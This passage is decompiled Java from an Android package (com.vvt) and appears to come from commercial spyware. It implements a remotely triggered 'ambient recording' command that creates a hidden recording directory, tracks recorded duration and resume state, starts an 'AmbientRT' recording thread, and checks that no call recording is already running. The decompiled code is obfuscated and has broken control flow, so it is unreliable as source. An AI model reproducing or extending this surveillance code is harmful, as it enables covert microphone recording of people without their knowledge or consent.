    //   13	38	6	localMediaMetadataRetriever	android.media.MediaMetadataRetriever
    //   57	1	6	localException2	Exception
    //   60	30	6	localObject4	Object
    // Exception table:
    //   from	to	target	type
    //   10	13	57	java/lang/Exception
    //   15	20	57	java/lang/Exception
    //   10	13	80	finally
    //   15	20	80	finally
    //   22	26	96	finally
    //   32	37	96	finally
    //   39	44	96	finally
    //   62	65	96	finally
    //   22	26	100	java/lang/Exception
    //   32	37	100	java/lang/Exception
    //   39	44	100	java/lang/Exception
  }
  
  public RmtCtrlOutputStatusMessage a(ControlCommand paramControlCommand, AppEngine1 paramh)
  {
    Object localObject1 = null;
    boolean bool1 = b;
    if (bool1) {}
    this.i = paramh;
    Object localObject2 = new com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    ((RmtCtrlOutputStatusMessage)localObject2).<init>();
    this.j = ((RmtCtrlOutputStatusMessage)localObject2);
    localObject2 = paramControlCommand.getData();
    Object localObject3 = new android/os/ConditionVariable;
    ((ConditionVariable)localObject3).<init>(false);
    this.k = ((ConditionVariable)localObject3);
    boolean bool4 = localObject2 instanceof Integer;
    int i2;
    Object localObject4;
    Object localObject5;
    boolean bool2;
    if (bool4)
    {
      int m = ((Integer)localObject2).intValue() * 60;
      i2 = m * 1000;
      localObject2 = this.i.b();
      this.e = ((String)localObject2);
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      localObject4 = this.e;
      localObject2 = ((StringBuilder)localObject2).append((String)localObject4);
      localObject4 = File.separator;
      localObject2 = ((StringBuilder)localObject2).append((String)localObject4).append("ar");
      localObject4 = File.separator;
      localObject2 = (String)localObject4;
      this.g = ((String)localObject2);
      localObject2 = new java/io/File;
      localObject4 = this.g;
      ((File)localObject2).<init>((String)localObject4);
      ((File)localObject2).mkdirs();
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      localObject4 = this.g;
      localObject2 = (String)localObject4 + "ambient_rec_id.id";
      this.h = ((String)localObject2);
      localObject2 = this.e;
      localObject4 = b((String)localObject2);
      if (localObject4 == null) {
        break label818;
      }
      localObject2 = (String)((Hashtable)localObject4).get("is_resume");
      if (localObject2 != null)
      {
        localObject5 = "1";
        bool2 = ((String)localObject2).equals(localObject5);
      }
    }
    for (;;)
    {
      boolean bool5 = b;
      int n;
      int i3;
      if ((!bool5) || ((bool2) && (localObject4 != null)))
      {
        localObject2 = (String)((Hashtable)localObject4).get("filename_without_extension");
        this.f = ((String)localObject2);
        localObject2 = this.f;
        localObject5 = this.g;
        localObject5 = a((String)localObject2, (String)localObject5);
        if (localObject5 != null)
        {
          n = localObject5.length;
          if (n > 0)
          {
            n = localObject5.length + -1;
            localObject2 = localObject5[n].getAbsolutePath();
            i3 = e((String)localObject2);
            localObject2 = (String)((Hashtable)localObject4).get("recorded_duration");
            if (localObject2 == null) {
              break label809;
            }
            n = Integer.parseInt((String)localObject2);
          }
        }
      }
      for (;;)
      {
        n += i3;
        String str1 = "recorded_duration";
        String str2 = Integer.toString(n);
        ((Hashtable)localObject4).put(str1, str2);
        boolean bool6 = b;
        if (bool6) {}
        n = i2 - n;
        if (n <= 0)
        {
          localObject2 = this.a;
          localObject1 = localObject5[0].getAbsolutePath();
          ((c)localObject2).b((String)localObject1);
          localObject2 = this.j;
        }
        for (;;)
        {
          return (RmtCtrlOutputStatusMessage)localObject2;
          n = 0;
          localObject2 = null;
          break;
          i2 = n / 60000;
          localObject3 = new java/lang/StringBuilder;
          ((StringBuilder)localObject3).<init>();
          localObject5 = this.g;
          localObject3 = ((StringBuilder)localObject3).append((String)localObject5);
          localObject5 = this.f;
          localObject3 = ((StringBuilder)localObject3).append((String)localObject5).append("_");
          long l1 = System.currentTimeMillis();
          localObject3 = ((StringBuilder)localObject3).append(l1);
          localObject5 = c();
          localObject3 = (String)localObject5;
          int i1;
          for (;;)
          {
            localObject5 = this.e;
            a((Hashtable)localObject4, (String)localObject5);
            boolean bool7 = b;
            if (bool7) {}
            bool7 = b;
            if (bool7) {}
            localObject4 = paramh.R;
            if (localObject4 == null) {
              break label755;
            }
            localObject4 = paramh.R;
            bool7 = ((com.vvt.capture.a.a)localObject4).e();
            if (!bool7) {
              break label755;
            }
            i1 = c;
            if (i1 != 0) {}
            this.j.setSuccess(false);
            localObject2 = this.j;
            localObject1 = "Cannot start the recording because the call recording is in progress.";
            ((RmtCtrlOutputStatusMessage)localObject2).setMessage((String)localObject1);
            localObject2 = this.e;
            c((String)localObject2);
            localObject2 = this.j;
            break;
            i1 = d;
            if (i1 != 0) {}
            localObject2 = a((Hashtable)localObject4);
            localObject3 = localObject2;
            i1 = i2;
            continue;
            localObject2 = a((Hashtable)localObject4);
            localObject3 = localObject2;
            i1 = i2;
          }
          label755:
          localObject1 = new com/vvt/appengine/a/r;
          localObject4 = "AmbientRT";
          ((r)localObject1).<init>(this, (String)localObject4, (String)localObject3, i1);
          ((r)localObject1).start();
          bool3 = b;
          if (bool3) {}
          localObject2 = this.k;
          ((ConditionVariable)localObject2).block();
          localObject2 = this.j;
        }
        label809:
        bool3 = false;
        localObject2 = null;
      }
      label818:
      boolean bool3 = false;
      localObject2 = null;
    }
  }
  
  public boolean a(String paramString)
  {
    boolean bool1 = false;
    String str1 = null;
    Object localObject = b(paramString);
    boolean bool3;
    if (localObject != null)
    {
      String str2 = "is_resume";
      localObject = (String)((Hashtable)localObject).get(str2);
      boolean bool2 = b;
      if ((!bool2) || (localObject != null))
      {
        str1 = "1";
        bool3 = ((String)localObject).equals(str1);
      }
    }
    for (;;)
    {
      bool1 = b;
      if (bool1) {}
      return bool3;
      bool3 = false;
      localObject = null;
      continue;
      bool3 = false;
      localObject = null;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/q.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */